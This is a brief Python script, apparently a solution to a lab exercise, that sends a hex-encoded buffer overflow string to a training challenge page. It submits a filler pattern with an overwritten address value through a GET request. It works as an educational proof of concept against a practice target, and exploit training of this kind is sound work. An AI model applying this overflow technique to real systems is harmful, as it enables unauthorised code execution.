#!/usr/bin/python
import requests
s = '4141414142424242434343434444444445454545464646464747474748484848494949494a0f9859564b4b4b4c4c4c4c4d4d4d4d4e4e4e4e'
params = { 'string' : s, 'submit' : 'run' }
response = requests.get('https://attack.samsclass.info/ED202e/ED202.8b1.php', params)
print(response.text)

        
